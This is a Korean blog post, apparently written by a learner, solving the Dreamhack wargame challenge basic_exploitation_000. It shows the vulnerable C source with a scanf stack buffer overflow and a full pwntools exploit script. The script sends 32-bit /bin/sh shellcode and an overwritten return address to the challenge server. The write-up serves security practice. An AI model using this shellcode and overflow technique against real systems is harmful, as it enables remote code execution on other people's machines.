@@ -1,0 +1,88 @@
+---
+title: "[Dreamhack] basic_exploitation_000 문제 풀이"
+date: "2024-07-14"
+tags: ["dreamhack", "system_hacking", "wargame"]
+draft: false
+summary: "요약: 오늘은 좀 쉬웠다 ㅋ"
+---
+
+# 문제 파악
+
+일단 이 문제는 쉽게도 C 소스 코드를 제공해준다.
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+
+void alarm_handler() {
+puts("TIME OUT");
+exit(-1);
+}
+
+void initialize() {
+setvbuf(stdin, NULL, _IONBF, 0);
+setvbuf(stdout, NULL, _IONBF, 0);
+
+signal(SIGALRM, alarm_handler);
+alarm(30);
+}
+
+int main(int argc, char *argv[]) {
+
+char buf[0x80];
+
+initialize();
+printf("buf = (%p)\n", buf);
+scanf("%141s", buf);
+
+return 0;
+}
+```
+
+코드는 위와 같다. 딱봐도 `scanf` 부분에서 BOF 가 발생하는 것을 볼 수 있는데,
+buf는 0x80(128 bytes)인데, 141 bytes를 받고 있다. ~~이건 알아봐야지 ㅇㅇ~~
+
+이 부분을 타겟삼아서 익스를 짜보겠다.
+
+# 익스코드 작성
+
+익스는 아래처럼 짜려고 한다.
+- esp~ebp까지의 간격~~이라고 해야하나..?~~ 어느정도인지 파악하기. -> 132byte 만큼 쓸거임
+- 구글링해서 32bit shellcode 가져오기 (아무거나 상관없을듯?)
+- 더미값 넣고 (shellcode 길이만큼 빼고)
+- buf 주소 넣으면? 끝
+
+```python
+from pwn import *
+import re
+
+context.update(arch='i386', os='linux')
+elf = ELF('./basic_exploitation_000')
+
+p = remote('host1.dreamhack.games', 19783)
+# p = process('./basic_exploitation_000')
+
+shellcode = b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80'
+buf = int(p.recv()[7:17], 16)
+print(f'buf : {hex(buf)}')
+
+payload = shellcode
+payload += b"A"*106
+payload += p32(buf)
+
+p.sendline(payload)
+
+p.interactive()
+```
+
+이렇게 짰다.
+
+결과는..!
+
+# 익스플로잇!!!!!!!!!
+
+![](https://i.imgur.com/xdx27Du.png)
+
+처음에 접속 했다 타임아웃 때문에 2트만에 성공!
